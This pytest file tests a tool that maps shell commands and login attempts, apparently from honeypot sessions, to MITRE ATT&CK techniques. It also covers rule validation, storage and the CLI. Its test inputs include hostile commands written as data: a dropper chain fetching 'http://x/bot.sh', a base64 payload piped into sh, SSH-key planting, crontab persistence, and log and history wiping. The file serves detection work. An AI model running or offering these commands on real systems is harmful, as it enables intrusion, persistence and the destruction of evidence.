"""Tests for the ATT&CK catalog, the mapping engine, rule quality, storage and CLI."""

import pytest
from sqlalchemy import func, select

from sample_events import SESSION_A, SESSION_A_EVENTS
from surya_kundal.cli import main
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import SessionMapping, TechniqueMatch
from surya_kundal.database.repository import save_session
from surya_kundal.ingest import store_events
from surya_kundal.mapping.attack import load_catalog
from surya_kundal.mapping.engine import (
    RuleError,
    load_rules,
    map_command,
    map_logins,
    normalize_segment,
    parse_rules,
    split_commands,
)
from surya_kundal.mapping.store import map_pending, map_session


def techniques(command):
    return {m.technique for m in map_command(command)}


# --- catalog ---------------------------------------------------------------


def test_catalog_contains_real_techniques():
    catalog = load_catalog()

    assert catalog.get("T1105").name == "Ingress Tool Transfer"
    assert "command-and-control" in catalog.get("T1105").tactics
    assert catalog.get("T1110.001").is_subtechnique
    assert catalog.get("T1110.001").url == "https://attack.mitre.org/techniques/T1110/001/"
    assert catalog.get("T9999") is None
    assert catalog.version


# --- rule quality ----------------------------------------------------------


def test_bundled_rules_load_and_use_only_real_techniques():
    ruleset = load_rules()

    assert len(ruleset.rules) >= 50
    catalog = load_catalog()
    assert all(rule.technique in catalog for rule in ruleset.rules)


@pytest.mark.parametrize("rule", load_rules().rules, ids=lambda r: r.id)
def test_every_rule_matches_its_examples_and_ignores_its_counter_examples(rule):
    assert rule.examples, f"{rule.id} needs at least one example"
    ruleset = load_rules()
    for example in rule.examples:
        fired = {m.rule_id for m in map_command(example, ruleset)}
        assert rule.id in fired, f"{rule.id} should match {example!r}"
    for example in rule.not_examples:
        fired = {m.rule_id for m in map_command(example, ruleset)}
        assert rule.id not in fired, f"{rule.id} should not match {example!r}"


def _rule(**overrides):
    fields = {"id": "r", "technique": "T1105", "pattern": "^x", "description": "d"}
    fields.update(overrides)
    lines = ["[[rule]]"] + [f"{k} = '''{v}'''" for k, v in fields.items()]
    return "\n".join(lines)


@pytest.mark.parametrize(
    ("text", "needle"),
    [
        (_rule(technique="T0000"), "not an ATT&CK technique"),
        (_rule(pattern="(unclosed"), "bad regex"),
        (_rule(confidence="certain"), "confidence"),
        (_rule(scope="galaxy"), "scope"),
        (_rule(description=""), "description"),
        (_rule() + "\n" + _rule(), "duplicate"),
        ("[[rule]\nbroken", "valid TOML"),
    ],
)
def test_invalid_rule_files_are_rejected_with_a_clear_message(text, needle):
    with pytest.raises(RuleError, match=needle):
        parse_rules(text)


def test_ruleset_version_changes_when_rules_change():
    a = parse_rules(_rule())
    b = parse_rules(_rule(pattern="^y"))

    assert a.version != b.version
    assert a.version == parse_rules(_rule()).version


# --- splitting and normalising ---------------------------------------------


def test_split_commands_on_all_separators():
    assert split_commands("cd /tmp; wget x && chmod +x a || rm a | cat\nls") == [
        "cd /tmp",
        "wget x",
        "chmod +x a",
        "rm a",
        "cat",
        "ls",
    ]


def test_split_commands_respects_quotes_and_escapes():
    assert split_commands('echo "a; b | c" ; ls') == ['echo "a; b | c"', "ls"]
    assert split_commands("echo 'x && y'") == ["echo 'x && y'"]
    assert split_commands(r"echo a\;b") == [r"echo a\;b"]


def test_redirections_are_not_command_separators():
    assert split_commands("cat x > /dev/null 2>&1") == ["cat x > /dev/null 2>&1"]
    assert split_commands("cmd &> out.txt") == ["cmd &> out.txt"]
    assert split_commands("sleep 5 & ls") == ["sleep 5", "ls"]


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("sudo wget http://x", "wget http://x"),
        ("sudo -n nohup /usr/bin/wget x", "wget x"),
        ("LANG=C FOO=1 uname -a", "uname -a"),
        ("/bin/busybox wget x", "wget x"),
        ("/bin/busybox ECCHI", "busybox ECCHI"),
        ("/tmp/x -a", "/tmp/x -a"),
        ("./run.sh", "./run.sh"),
    ],
)
def test_normalize_segment(raw, expected):
    assert normalize_segment(raw) == expected


# --- mapping behaviour -----------------------------------------------------


def test_wrappers_and_paths_do_not_hide_a_command():
    assert "T1105" in techniques("sudo /usr/bin/wget http://x/a")
    assert "T1105" in techniques("cd /tmp && wget http://x/a")


def test_commands_inside_substitution_are_analysed():
    assert "T1057" in techniques("kill -9 $(pidof sshd)")
    assert "T1033" in techniques("echo `whoami`")


def test_a_quoted_string_is_not_a_command():
    assert "T1105" not in techniques('echo "wget http://x/a"')


def test_a_typical_botnet_dropper_chain_maps_to_the_expected_techniques():
    chain = "cd /tmp; wget http://x/bot.sh; chmod +x bot.sh; ./bot.sh; rm -f bot.sh"

    found = techniques(chain)

    assert {"T1105", "T1222.002", "T1059.004", "T1070.004"} <= found


def test_encoded_payload_piped_into_a_shell():
    found = techniques("echo ZWNobyBoaQ== | base64 -d | sh")

    assert {"T1140", "T1059.004"} <= found


def test_persistence_and_cleanup_commands():
    assert "T1098.004" in techniques("echo ssh-rsa AAAA x >> ~/.ssh/authorized_keys")
    assert "T1053.003" in techniques("(crontab -l; echo '* * * * * /tmp/x') | crontab -")
    assert "T1070.003" in techniques("history -c")
    assert "T1690" in techniques("unset HISTFILE")
    assert "T1685.006" in techniques("rm -rf /var/log/*")


def test_a_well_known_ssh_key_planting_one_liner():
    line = (
        "cd ~ && rm -rf .ssh && mkdir .ssh"
        ' && echo "ssh-rsa AAAAB3Nza attacker">>.ssh/authorized_keys'
        " && chmod -R go= ~/.ssh"
    )

    assert {"T1098.004", "T1070.004"} <= techniques(line)
    assert "T1222.002" in techniques("cd ~; chattr -ia .ssh")


def test_harmless_commands_map_to_little_or_nothing():
    assert techniques("echo hello") == set()
    assert techniques("cd /tmp") == set()
    assert techniques("") == set()


def test_each_rule_fires_at_most_once_per_command_with_evidence():
    matches = map_command("uname -a; uname -r")

    assert [m.rule_id for m in matches].count("discovery-system-info") == 1
    assert matches[0].evidence


def test_long_evidence_is_truncated():
    match = map_command("wget http://x/" + "a" * 1000)[0]

    assert len(match.evidence) <= 300


# --- login mapping ---------------------------------------------------------


def _logins(*pairs):
    return [{"username": u, "success": ok} for u, ok in pairs]


def test_repeated_failed_logins_are_password_guessing():
    matches = map_logins(_logins(("root", False), ("root", False), ("admin", False)))

    assert [(m.technique, m.confidence) for m in matches] == [("T1110.001", "medium")]


def test_many_failed_logins_raise_confidence():
    matches = map_logins(_logins(*[("root", False)] * 10))

    assert matches[0].confidence == "high"


def test_two_failures_are_not_enough():
    assert map_logins(_logins(("root", False), ("root", False))) == []


def test_login_with_a_default_username_is_a_default_account():
    matches = map_logins(_logins(("root", True)))

    assert [m.technique for m in matches] == ["T1078.001"]


def test_login_with_another_username_is_a_valid_account():
    assert [m.technique for m in map_logins(_logins(("jenkins-ci", True)))] == ["T1078"]


# --- storage ---------------------------------------------------------------


@pytest.fixture
def db():
    engine = create_db_engine("sqlite://")
    init_db(engine)
    with make_session_factory(engine)() as session:
        yield session


def _count(db, model):
    return db.scalar(select(func.count()).select_from(model))


def _store_session_a(db):
    store_events(db, SESSION_A_EVENTS)
    db.commit()


def test_map_pending_stores_matches_tied_to_commands(db):
    _store_session_a(db)

    result = map_pending(db)

    assert result.sessions == 1
    rows = db.scalars(select(TechniqueMatch)).all()
    by_technique = {r.technique_id: r for r in rows}
    assert "T1033" in by_technique  # whoami
    assert by_technique["T1033"].command_id is not None
    assert by_technique["T1033"].tactics == "discovery"
    assert "T1087.001" in by_technique  # cat /etc/passwd
    assert "T1078.001" in by_technique  # successful root login
    assert by_technique["T1078.001"].command_id is None


def test_mapping_twice_changes_nothing(db):
    _store_session_a(db)
    map_pending(db)
    before = _count(db, TechniqueMatch)

    result = map_pending(db)

    assert result.sessions == 0
    assert _count(db, TechniqueMatch) == before == len(db.scalars(select(TechniqueMatch)).all())


def test_a_session_is_remapped_when_it_gains_commands(db):
    _store_session_a(db)
    map_pending(db)
    session = db.get(SessionMapping, SESSION_A)
    assert session.command_count == 2

    save_session(
        db,
        SESSION_A,
        {
            "src_ip": "203.0.113.7",
            "commands": [{"command": "uname -a", "timestamp": "2026-10-05T07:12:30.000000Z"}],
        },
    )
    db.commit()
    result = map_pending(db)

    assert result.sessions == 1
    assert "T1082" in {r.technique_id for r in db.scalars(select(TechniqueMatch))}


def test_a_session_is_remapped_when_the_rules_change(db):
    _store_session_a(db)
    map_pending(db)
    other = parse_rules(_rule(id="only", technique="T1033", pattern="^whoami"))

    result = map_pending(db, other)

    assert result.sessions == 1
    assert {r.rule_id for r in db.scalars(select(TechniqueMatch))} == {
        "only",
        "login-default-account",
    }


def test_remapping_replaces_instead_of_duplicating(db):
    _store_session_a(db)
    map_session(db, SESSION_A)
    first = _count(db, TechniqueMatch)

    map_session(db, SESSION_A)

    assert _count(db, TechniqueMatch) == first


def test_mapping_an_unknown_session_raises(db):
    with pytest.raises(KeyError):
        map_session(db, "nope")


def test_one_bad_session_does_not_stop_the_rest(db, monkeypatch):
    _store_session_a(db)
    from surya_kundal.mapping import store

    def explode(*_a, **_k):
        raise RuntimeError("boom")

    monkeypatch.setattr(store, "map_command", explode)

    result = map_pending(db)

    assert (result.sessions, result.failed) == (0, 1)


# --- CLI -------------------------------------------------------------------


@pytest.fixture
def cli_db(tmp_path):
    url = f"sqlite:///{tmp_path}/m.db"
    engine = create_db_engine(url)
    init_db(engine)
    with make_session_factory(engine)() as session:
        _store_session_a(session)
    return url


def test_cli_map_then_techniques_then_show(cli_db, capsys):
    assert main(["map", "--db", cli_db]) == 0
    assert "Mapped 1 session(s)" in capsys.readouterr().out

    assert main(["techniques", "--db", cli_db]) == 0
    out = capsys.readouterr().out
    assert "T1033" in out and "System Owner/User Discovery" in out
    assert "MITRE ATT&CK" in out

    assert main(["show", SESSION_A[:6], "--db", cli_db]) == 0
    out = capsys.readouterr().out
    assert "$ whoami" in out
    assert "-> T1033" in out
    assert "downloaded" in out


def test_cli_techniques_before_mapping_explains_what_to_do(cli_db, capsys):
    assert main(["techniques", "--db", cli_db]) == 0

    assert "surya-kundal map" in capsys.readouterr().out


def test_cli_show_unknown_session_fails_cleanly(cli_db, capsys):
    assert main(["show", "zzz", "--db", cli_db]) == 2

    assert "no session" in capsys.readouterr().err
